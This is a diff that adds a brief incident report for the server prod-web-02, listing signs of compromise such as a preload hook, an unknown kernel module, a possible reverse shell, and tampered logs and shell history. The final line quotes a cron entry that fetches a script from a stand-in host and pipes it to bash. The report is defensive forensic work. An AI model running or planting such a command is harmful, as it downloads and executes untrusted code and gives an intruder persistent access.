@@ -1,0 +1,9 @@
+Incident Report
+Hostname: prod-web-02
+rkhunter warning: suspicious file properties found
+Unknown kernel module observed during memory inspection
+/etc/ld.so.preload contains unexpected preload hook
+Process 1842 is running from a deleted executable
+Unauthorized listener found, possible reverse shell
+auth.log modified and shell history cleared
+Suspicious cron entry: @reboot curl http://example.invalid/a.sh | bash
